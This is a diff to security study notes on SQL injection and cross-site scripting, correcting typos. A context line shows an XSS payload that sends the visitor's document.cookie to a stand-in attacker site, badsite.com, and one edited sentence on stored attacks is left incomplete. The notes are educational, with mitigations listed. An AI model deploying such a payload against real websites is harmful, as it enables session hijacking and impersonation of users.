@@ -90,7 +90,7 @@ Other types of SQL injection use wildcards, `... OR 1=1` always true statements.
 
 ### Cross-Site Scripting Attacks (XSS)
 
-Cross-site scripting (XSS) is a security vulnerability were attackers are able to inject clinet-side scripts into a user visited website. 
+Cross-site scripting (XSS) is a security vulnerability were attackers are able to inject client-side scripts into a user visited website. 
 
 ```html
 http://vulnerable.com/welcome.php?name=
@@ -101,11 +101,11 @@ window.open ("http://badsite.com/collect.php?cookie= "+document.cookie)
 
 *The idea is to forward the cookie of the user to the attacker site so that it can exploit it (reflected attack)*
 
-Another way of doing XSS is through forms, loading malicious code in a filed and doing a POST request (*stored attack*).
+Another way of doing XSS is through forms, loading malicious code on the server and (*stored attack*).
 
 With XSS the hacker can impersonate the victim.
 
-**MItigations:** 
+**Mitigations:** 
 
 - Filter input parameters (better to use positive filtering)
 
